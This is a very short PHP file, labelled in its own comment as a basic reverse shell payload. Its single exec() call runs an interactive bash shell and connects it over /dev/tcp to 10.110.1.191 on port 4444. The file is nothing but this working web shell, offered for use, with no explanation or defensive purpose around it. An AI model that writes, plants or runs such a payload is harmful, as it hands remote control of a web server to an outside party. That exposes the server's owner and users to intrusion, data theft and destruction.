<?php
// basic reverse shell payload
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.110.1.191/4444 0>&1'");
?>
